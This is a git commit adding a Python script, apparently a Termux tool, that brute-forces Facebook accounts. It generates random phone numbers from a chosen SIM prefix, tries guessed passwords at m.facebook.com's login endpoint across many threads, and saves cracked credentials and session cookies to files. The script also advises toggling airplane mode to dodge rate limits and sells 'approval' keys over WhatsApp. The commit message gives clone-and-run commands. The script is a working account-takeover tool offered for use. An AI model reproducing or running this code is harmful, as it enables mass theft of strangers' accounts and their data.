ef93bcb64ca4d6c8c39be014a60735afa4130d36
asscommand <127822032+asscommand@users.noreply.github.com>
2023-04-27 14:43:26 +0545

    Create chy.py
    rm -rf chy
    git clone https://github.com/asscommand/chy.git
    ls
    cd chy
    ls
    python chy.py

---
+++ chy.py
@@ -0,0 +1,553 @@
+	print('[?] Ids saved in ok.txt,cp.txt')	input('Press Inter To Back Menu')
+
+	rehan()
+
+#____________
+
+#_______
+
+def malik_baloch():
+
+	user=[]
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+
+	lines()
+
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[•] MAX LIMIT [50000]')
+
+	lines()
+
+	limit = int(input('[•] ENTER LIMIT :  '))
+
+	for nmbr in range(limit):
+
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+		user.append(nmp)
+
+	with ThreadPool(max_workers=60) as yaari:
+
+		os.system('clear')
+
+		print(logo)
+
+		tl = str(len(user))
+
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mMALIK + BALOCH')
+
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+
+		lines()
+
+		for guru in user:
+
+			uid = kode+guru
+
+			pwx = [guru,'malik123','malik1122','baloch786']
+
+			yaari.submit(fcrack,uid,pwx,tl)
+
+	print('[✓] Crack process has been completed')
+
+	print('[?] Ids saved in ok.txt,cp.txt')
+
+	input('Press Inter To Back Menu')
+
+	rehan()
+
+#____
+
+def pubg():
+
+	user=[]
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+
+	lines()
+
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[•] MAX LIMIT [50000]')
+
+	lines()
+
+	limit = int(input('[•] ENTER LIMIT :  '))
+
+	for nmbr in range(limit):
+
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+		user.append(nmp)
+
+	with ThreadPool(max_workers=30) as yaari:
+
+		os.system('clear')
+
+		print(logo)
+
+		tl = str(len(user))
+
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mPUBG')
+
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+
+		lines()
+
+		for guru in user:
+
+			uid = kode+guru
+
+			pwx = [guru,'pubgqueen','pubgking','pubglover']
+
+			yaari.submit(fcrack,uid,pwx,tl)
+
+	print('[✓] Crack process has been completed')
+
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+
+	input('Press Enter To Go Back To Menu')
+
+	rehan()
+
+#____
+
+def ff():
+
+	user=[]
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
+
+	lines()
+
+	kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[•] MAX LIMIT [50000]')
+
+	lines()
+
+	limit = int(input('[•] ENTER LIMIT :  '))
+
+	for nmbr in range(limit):
+
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+		user.append(nmp)
+
+	with ThreadPool(max_workers=30) as yaari:
+
+		os.system('clear')
+
+		print(logo)
+
+		tl = str(len(user))
+
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mFREE FIRE')
+
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+
+		lines()
+
+		for guru in user:
+
+			uid = kode+guru
+
+			pwx = [guru,'freefire','fflover','ffking','ffqueen']
+
+			yaari.submit(fcrack,uid,pwx,tl)
+
+	print('[✓] Crack process has been completed')
+
+	print('[?] Idz saved in [ok.txt,cp.txt]')
+
+	input('Press Enter To Go Back To Menu')
+
+	rehan()
+
+#___________
+
+def bd():
+
+	user=[]
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[•] EXAMPLE : 088***,88***,88****,88****,.ETC')
+
+	lines()
+
+	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
+
+	os.system('clear')
+
+	print(logo)
+
+	print('[•] MAX LIMIT [50000]')
+
+	lines()
+
+	limit = int(input('[•] ENTER LIMIT :  '))
+
+	for nmbr in range(limit):
+
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+		user.append(nmp)
+
+	with ThreadPool(max_workers=70) as yaari:
+
+		os.system('clear')
+
+		print(logo)
+
+		tl = str(len(user))
+
+		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
+
+		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
+
+		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mBANGLA')
+
+		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
+
+		lines()
+
+		for guru in user:
+
+			uid = kode+guru
+
+			pwx = [guru,'+88','bangladish']
+
+			yaari.submit(fcrack,uid,pwx,tl)
+
+	print('[✓] Crack process has been completed')
+
+	print('[?] Ids saved in ok.txt,cp.txt')
+
+	input('Press Inter To Back Menu')
+
+	rehan()
+
+def chos():
+
+    user=[]
+
+    twf =[]
+
+    os.getuid
+
+    os.geteuid
+
+    os.system("clear")
+
+    print(logo)
+
+    print('\x1b[1;91m[•] YOUR SIM CODE: ')
+
+    lines()
+
+    code = input(' Your Code : ')
+
+    lines()
+
+    os.system('clear')
+
+    print(logo)
+
+    print('[•] MAX LIMIT [50000]')
+
+    lines()
+
+    limit = int(input('[•] LIMIT :  '))
+
+    for nmbr in range(limit):
+
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+
+        user.append(nmp)
+
+    os.system("clear")
+
+    print(logo)
+
+    print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
+
+    lines()
+
+    passx = int(input("[•] ENTER PASSWORD LIMIT : "))
+
+    HamiiID = []
+
+    os.system('clear')
+
+    print(logo)
+
+    print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
+
+    lines()
+
+    for bilal in range(passx):
+
+        pww = input(f"[•] ENTER PASSWORDS {bilal+1} : ")
+
+        HamiiID.append(pww)
+
+    with ThreadPool(max_workers=70) as manshera:
+
+        os.system('clear')
+
+        print(logo)
+
+        tl = str(len(user))
+
+        lines()
+
+        for love in user:
+
+            pwx = [love[1:]]
+
+            uid = code+love
+
+            for Eman in HamiiID:
+
+                pwx.append(Eman)
+
+                pwx.append(love)
+
+            manshera.submit(fcrack,uid,pwx,tl)
+
+    print('Crack process has been completed')
+
+    print('Ids saved in ok.txt,cp.txt')
+
+    rehan()
+
+#_____
+
+def fcrack(uid,pwx,tl):
+
+    #print(user)
+
+    global loop
+
+    global cps
+
+    global oks
+
+    global proxy
+
+    
+
+    try:
+
+        for ps in pwx:
+
+            pro = random.choice(ugen)
+
+            session = requests.Session()
+
+            free_fb = session.get('https://free.facebook.com').text
+
+            log_data = {
+
+                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+
+            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+
+            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+
+            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+
+            "try_number":"0",
+
+            "unrecognized_tries":"0",
+
+            "email":uid,
+
+            "pass":ps,
+
+            "login":"Log In"}
+
+            header_freefb = {'authority': 'm.facebook.com',
+
+			'upgrade-insecure-requests': '1',
+
+			'viewport-width': '980',
+
+			'method': 'path',
+
+			'scheme': 'https',
+
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+
+			'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
+
+			'dnt':'1', 
+
+			'x-requested-with':'mark.via.gp', 
+
+			'sec-fetch-site': 'none',
+
+			'sec-fetch-mode': 'navigate',
+
+			'sec-fetch-user': '?1',
+
+			'sec-fetch-dest': 'document',
+
+			'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
+
+			'cache-control': 'max-age=0',
+
+			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
+
+			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
+
+			"sec-ch-prefers-color-scheme": "light",
+
+			'user-agent': pro}
+
+            lo = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+
+            log_cookies=session.cookies.get_dict().keys()
+
+            #print(iid+'|'+pws+'|'+str(log_cookies))
+
+            if 'c_user' in log_cookies:
+
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                cid = coki[151:166]
+
+                print('\033[1;32m[SANA-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+
+                open('LPC-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+
+                oks.append(cid)
+
+                break
+
+            elif 'checkpoint' in log_cookies:
+
+                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+
+                cid = coki[141:152]
+
+                # print('\033[1;33m[SANA-CP] '+uid+' | '+ps+'\x1b[1;97m')
+
+                open('LPC-CP.txt', 'a').write(uid+' | '+ps+'\n')
+
+                cps.append(cid)
+
+                break
+
+            else:
+
+                continue
+
+        loop+=1
+
+        sys.stdout.write(f'\r[\033[1;97mSANA\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+
+        sys.stdout.flush()
+
+    except:
+
+        pass
+
+        
+
+def approval():
+
+  os.system('clear')
+
+  print(logo)
+
+  uuid = str(os.geteuid()) + str(os.getlogin())
+
+  id = "-".join(uuid)
+
+  try:
+
+    httpCaht = requests.get('https://github.com/Kaptan302/Apr/blob/main/Apr.txt').text
+
+    if id in httpCaht:
+
+      print("\33[1;32mYOUR KEY IS APPROVED.")
+
+      msg = str(os.geteuid())
+
+      time.sleep(0.5)
+
+      rehan()
+
+      pass
+
+    else:
+
+      print("YOUR KEY : "+id)
+
+      print('\33[1;37m----------------------------------------------')
+
+      print("\33[1;32mNOTE:")
+
+      print("\33[1;37m----------------------------------------------")
+
+      print("\33[1;37mTOOL IS FREE BUT YOU HAVE TO\nGET APPROVAL FIRST.")
+
+      print('\33[1;37m----------------------------------------------')
+
+      print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
+
+      input('IF U WANT TO BUY THEN PRESS ENTER ')
+
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923498410573?text='+tks),approval()
+
+      time.sleep(1)
+
+      approval()
+
+  except:
+
+    sys.exit()
+
+rehan()
